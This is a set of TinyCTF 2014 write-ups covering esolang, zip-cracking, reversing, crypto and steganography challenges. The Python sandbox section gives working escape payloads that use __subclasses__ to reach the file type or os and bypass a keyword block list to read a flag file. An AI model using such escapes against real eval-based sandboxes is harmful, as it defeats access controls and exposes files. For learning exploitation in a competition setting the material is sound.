TinyCTF: Write-ups
==================

#Misc 50

###CAN HAS STDIO?

Source:

```brainfuck


                                      +
                                     ++
                                     +++
                                    ++[>
                                    +>++>
                                   +++>++
                                   ++>++++
                                  +>++++++
                                  >+++++++>
                                 ++++++++>+
                                 ++++++++>++
                                ++++++++>+++
                                ++++++++>++++
          ++++++++>+++++++++++++>++++++++++++++>+++++++++++++++>++
            ++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>>>>>>>--.++<<
              <<<<<<<<<<<>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<
                >>>>>>>>>>>>+.-<<<<<<<<<<<<>>>>>>>>>>>>>-.+<
                  <<<<<<<<<<<<>>>>>>>>>>>>>>>+++.---<<<<<<
                    <<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<
                      <<<<<<>>>>>>>>>>>>>>+++.---<<<<<
                        <<<<<<<<<>>>>>>>>>>>>>>-.+<<
                          <<<<<<<<<<<<>>>>>>>>>>>>
                          >>----.++++<<<<<<<<<<<<<
                          <>>>>>>>>>>>>+.-<<<<<<<<
                         <<<<>>>>>>>>>>>>>>--.++<<<
                         <<<<<<<<<<<>>>>>>>>>>>>>-.
                        +<<<<<<<<<<<<<>>>>>>>>>>>>>>
                        +++.---<<<<<<   <<<<<<<<>>>>
                       >>>>>>>>-.+<       <<<<<<<<<<<
                       >>>>>>>>>>           >>>--.++<
                      <<<<<<<<<               <<<>>>>>
                      >>>>>>                    >>>-.+
                     <<<<<                        <<<<<
                     <<<                            <>>
                    >>                                >>



>>>>>>>>++.--<<<<<<<<<<<<<<>>>>>>>>>>>>-.+<<<<<<<<<<<<>>>>>>>>>>>>>--.++<<<<<<<<<<<<<>>>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<<<>>>>>>>>>>>>>>--.++<<<<<<<<<<<<<<>>>>>>>>>>>>-.+<<<<<<<<<<<<>>>>>>>>>>>>+.-<<<<<<<<<<<<>>>>>>>>>>>>>>--.++<<<<<<<<<<<<<<>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<>>>>>>>>>>>>-.+<<<<<<<<<<<<>>>>>>>>>>>>>>.<<<<<<<<<<<<<<>>>>>>>>>>>>>>++.--<<<<<<<<<<<<<<>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<>>>>>>>>>>>>>--.++<<<<<<<<<<<<<>>>>>>>>>>>>>+.-<<<<<<<<<<<<<>>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<<<<.
```

The solution is obvious (for those who know what it is). It totally looks like something that is written in brainfuck, the esotheric programming language. So we quickly find online interpreter, run it and find the flag:

> flag{esolangs_for_fun_and_profit}

#Misc 100

###János the Ripper

Source: misc100

```shell
 % file misc100
misc100: Zip archive data, at least v2.0 to extract
 % unzip misc100
	Archive:  misc100
[misc100] flag.txt password:
```

So it's zip with some password then. Searching through tools to crack or bruteforce zip password gives me <kbd>fcrackzip</kbd> tool.

We run it:

```shell
% fcrackzip -b -c 'aA1!' -l 1-5 -u ./misc100
...
PASSWORD FOUND!!!!: pw == fish
```

Everything else is a matter of time - there's *flag.txt* file inside.

```shell
 % cat flag.txt
flag{ev3n::y0u::bru7us?!}
```

#Rev 100

###tt3441810

Source: rev100

Contents:

```
00400080  68 66 6C 00 00 48 BF 01  00 00 00 00 00 00 00 48
00400090  8D 34 24 48 BA 02 00 00  00 00 00 00 00 48 B8 01
004000A0  00 00 00 00 00 00 00 0F  05 68 61 67 00 00 48 BF
004000B0  01 00 00 00 00 00 00 00  48 8D 34 24 48 BA 02 00
004000C0  00 00 00 00 00 00 48 B8  01 00 00 00 00 00 00 00
004000D0  0F 05 68 7B 70 00 00 48  BF 01 00 00 00 00 00 00
004000E0  00 48 8D 34 24 48 BA 02  00 00 00 00 00 00 00 48
004000F0  B8 01 00 00 00 00 00 00  00 0F 05 68 6F 70 00 00
00400100  48 BF 01 00 00 00 00 00  00 00 48 8D 34 24 48 BA
00400110  02 00 00 00 00 00 00 00  48 B8 01 00 00 00 00 00
00400120  00 00 0F 05 68 70 6F 00  00 48 BF 01 00 00 00 00
00400130  00 00 00 48 8D 34 24 48  BA 02 00 00 00 00 00 00
00400140  00 48 B8 01 00 00 00 00  00 00 00 0F 05 68 70 72
00400150  00 00 48 BF 01 00 00 00  00 00 00 00 48 8D 34 24
00400160  48 BA 02 00 00 00 00 00  00 00 48 B8 01 00 00 00
00400170  00 00 00 00 0F 05 68 65  74 00 00 48 BF 01 00 00
00400180  00 00 00 00 00 48 8D 34  24 48 BA 02 00 00 00 00
00400190  00 00 00 48 B8 01 00 00  00 00 00 00 00 0F 05 68
004001A0  7D 0A 00 00 48 BF 01 00  00 00 00 00 00 00 48 8D
004001B0  34 24 48 BA 02 00 00 00  00 00 00 00 48 B8 01 00
004001C0  00 00 00 00 00 00 0F 05  48 31 FF 48 B8 3C 00 00
004001D0  00 00 00 00 00 0F 05
```

I fired <kbd>Hex Fiend</kbd> and copied all the contents to produce *rev100.hex*:

```
flH�H�4$H�H�hagH���BD�� H��V����H�4$H�H�hopH�H�4$H�H�hpoH�H�4$H�H�hprH�H�4$H�H�hetH�H�4$H�H�h}
H�H�4$H�H�H1�H�<
```

From the first look we see 'fl' header. Assuming it's obfuscated file, we quickly compiling rest of the flag (every part starts with h)

> flag{poppopret}

#Rev 200

###Ooooooh! What does this button do?

Source: rev200

Contents:

```
-rwxr-xr-x@ 1 evanowe  staff    1804 23 сен 23:53 AndroidManifest.xml
drwxr-xr-x@ 5 evanowe  staff     170 29 сен 00:18 META-INF
-rwxr-xr-x@ 1 evanowe  staff  909008 23 сен 23:53 classes.dex
drwxr-xr-x@ 8 evanowe  staff     272 29 сен 00:18 res
-rwxr-xr-x@ 1 evanowe  staff    2572 23 сен 23:53 resources.arsc
```

So this is android app, presumably decompiled with <kbd>apktool</kbd>. Most interesting part is *classes.dex*, containing actual code. Everything else is pretty much standard stuff.

To produce readable code we use <kbd>dex2jar</kbd> tool

```
dex2jar ./classes.dex
this cmd is deprecated, use the d2j-dex2jar if possible
dex2jar version: translator-0.0.9.15
dex2jar ./classes.dex -> ./classes_dex2jar.jar
```

Further down, we decompile *jar* file with <kbd>JD-GUI</kbd>.

Strolling through the code we find particulary interesting class: *FlagActivity*:

```java
package ctf.crackme;

import android.app.Activity;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.widget.TextView;

public class FlagActivity extends Activity
{
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2130903040);
    String str = "";
    int[] arrayOfInt = { 102, 108, 97, 103, 123, 119, 52, 110, 110, 52, 95, 106, 52, 114, 95, 109, 121, 95, 100, 51, 120, 125 };
    for (int i = 0; ; i++)
    {
      if (i >= 22)
      {
        ((TextView)findViewById(2131230721)).setText(str);
        return;
      }
      str = str.concat(String.valueOf((char)arrayOfInt[i]));
    }
  }

  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    getMenuInflater().inflate(2131165184, paramMenu);
    return true;
  }

  public boolean onOptionsItemSelected(MenuItem paramMenuItem)
  {
    if (paramMenuItem.getItemId() == 2131230724)
      return true;
    return super.onOptionsItemSelected(paramMenuItem);
  }
}
```

From what it seems to be doing, it just renders the chars of the corresponding numeric values and concatenates them into string. So the easiest way to get the flag is to create new java class in Eclipse, in my case, copy piece of code form there and run it. Let's see what we got:

```
f
fl
fla
flag
flag{
flag{w
flag{w4
flag{w4n
flag{w4nn
flag{w4nn4
flag{w4nn4_
flag{w4nn4_j
flag{w4nn4_j4
flag{w4nn4_j4r
flag{w4nn4_j4r_
flag{w4nn4_j4r_m
flag{w4nn4_j4r_my
flag{w4nn4_j4r_my_
flag{w4nn4_j4r_my_d
flag{w4nn4_j4r_my_d3
flag{w4nn4_j4r_my_d3x
flag{w4nn4_j4r_my_d3x}
```

Aha, here's our flag.

> flag{w4nn4_j4r_my_d3x}

#Exp 200

###Not exactly Alcatraz

> Description: Exploit this
>
> Over here: nc 54.69.118.120 6000
>
> Flag is in /home/pybaby/flag.txt

So connecting to the given address gives us some sort of shell:

```
  % nc 54.69.118.120 6000

Welcome to Safe Interactive CPython Shell (SICS)
================================================

Rules:
    - Wash your dishes
    - Don't eat the yellow snow
    - Do not import anything
    - No peeking at files!
```

And downloaded pwn200 is the python code, representing the server-side running script. I've seen this type of challenge before on CSAW 2014 challenges.

```python
#!/usr/bin/python

def serve():
		"Serve a request"

		print "baby@sics:~$",

		code = raw_input()

		if validate(code):
				print eval(code)
		else:
				print "#rekt"

def validate(code):
		"Hyper-secure, military grade python sandboxing"

		prohibited_keywords = [
				"import",
				"open",
				"flag",
				"eval",
				"exec"
		]

		for keyword in prohibited_keywords:
				if keyword in code:
						return False

		return True

def main():
		print """
Welcome to Safe Interactive CPython Shell (SICS)
================================================

Rules:
		- Wash your dishes
		- Don't eat the yellow snow
		- Do not import anything
		- No peeking at files!
"""

		while True:
				serve()

if __name__ == '__main__':
		main()


```

There are prohibited keywords: *import, open, flag, eval and exec.* There are some useful write-ups on these type of challenges: [http://tomforb.es/breaking-out-of-secured-python-environments](http://tomforb.es/breaking-out-of-secured-python-environments), [http://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](http://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/), [https://isisblogs.poly.edu/2012/10/26/escaping-python-sandboxes/](https://isisblogs.poly.edu/2012/10/26/escaping-python-sandboxes/).

So our research starts with enumerating available subclasses and types and search for something interesting, like os() calls.

```
[].__class__.__base__.__subclasses__()
baby@sics:~$ [<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'sys.floatinfo'>, <type 'EncodingMap'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <class 'site._Printer'>, <class 'site._Helper'>, <type 'pwd.struct_passwd'>, <type 'file'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
```

There's, I think, many ways to do this. For example, finding class that contains os calls, like

> ().**class**.**base**.**subclasses**()[59].**init**.func_globals["linecache"].**dict**["os"]

I went for easy way. We see particulary interesting *type 'file'*. Alright, so now we can read read our flag:

```
[].__class__.__base__.__subclasses__()[59]('/home/pybaby/flag.txt').read()
baby@sics:~$ #rekt
```

No, something not right. Right, we are prohibited to use 'flag' keyword. Let's try quick and dirty hack:

```
[].__class__.__base__.__subclasses__()[59]('/home/pybaby/f'+'lag.txt').read()
baby@sics:~$ flag{python_sandboxing:_harder_than_teaching_your_mom_dota}
```

Yeah, it works!

> flag{python_sandboxing:_harder_than_teaching_your_mom_dota}

#Cry 100

###Safer than rot13

Source: cry100

Contents:

```
MVZGC RGC AMG RVMG HGFGMQYCD VT VWM BYNO, NSVWDS NSGO RAO XG UWFN AF
HACDGMVWF. AIRVFN AII AMG JVRRVC-XVMC, FYRBIG TVIZ ESV SAH CGQGM XGGC
RVMG NSAC A RYIG TMVR NSG SVWFG ESGMG NSGO EGMG XVMC WCNYI NSG HAO
FVRG IVMH JARG MVWCH NV NAZG NSGR VTT NV EAM. OVWM TIAD YF "CV NSYF
YF CVN JMOBNV RO HGAM", YC IVEGMJAFG, EYNS WCHGMFJVMGF YCFNGAH VT
FBAJGF, FWMMVWCHGH XO NSG WFWAI "TIAD" NAD ACH JWMIO XMAJGF. GCUVO.
```

Looking at structure, we see that everything is in place - punctuation, words. So we assume that some sort of substition cipher is used. Maybe we should search for online solvers? [quipqiup.com](http://quipqiup.com) is one of them, and gives us following result.

```
BROKEN MEN ARE MORE DESERVING OF OUR PITY, THOUGH THEY MAY BE JUST AS
DANGEROUS. ALMOST ALL ARE COMMON-BORN, SIMPLE FOLK WHO HAD NEVER BEEN
MORE THAN A MILE FROM THE HOUSE WHERE THEY WERE BORN UNTIL THE DAY SOME
LORD CAME ROUND TO TAKE THEM OFF TO WAR. YOUR FLAG IS 'NO THIS IS NOT
CRYPTO MY DEAR', IN LOWERCASE, WITH UNDERSCORES INSTEAD OF SPACES,
SURROUNDED BY THE USUAL 'FLAG' TAG AND CURLY BRACES. ENJOY.

```

So yeah, that was actually easy.

> flag{no_this_is_not_crypto_my_dear}

#Steganography 100

###Erik, Baleog and Olaf

We are given *stego100.png* file.

![Image](https://dl.dropboxusercontent.com/u/606193/TinyCTF2014/stego100.png)

This is an image of three vikings. Quick look through contrast and hidden layers gives us nothing.

Then I ran some standard operations

> pngcheck

Everything was alright, nothing to see here.

> exiftool

This gives us a hint:

```
ExifTool Version Number         : 9.72
File Name                       : stego100.png
Directory                       : .
File Size                       : 26 kB
File Modification Date/Time     : 2014:09:29 01:34:57+04:00
File Access Date/Time           : 2014:09:30 11:02:11+04:00
File Inode Change Date/Time     : 2014:09:29 01:55:19+04:00
File Permissions                : rwxr-xr-x
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 640
Image Height                    : 480
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Hint                            : http://i.imgur.com/22kUrzm.png
Image Size                      : 640x480
```

Downloaded provided link gives us exact copy of this image. Except the size differs.

```
 29520 29 сен 01:30 22kUrzm.png
 26857 29 сен 01:34 stego100.png
```

Is there a way to diff two images? Apparently so, there's ImageMagick's tool called compare.

```
compare stego100.png 22kUrzm.png -compose src diff.png
```

We open produced image - and voila, there is QR-code, which gives us the resulting flag.

![Diff](https://dl.dropboxusercontent.com/u/606193/TinyCTF2014/diff.png)

> flag{#justdiffit}
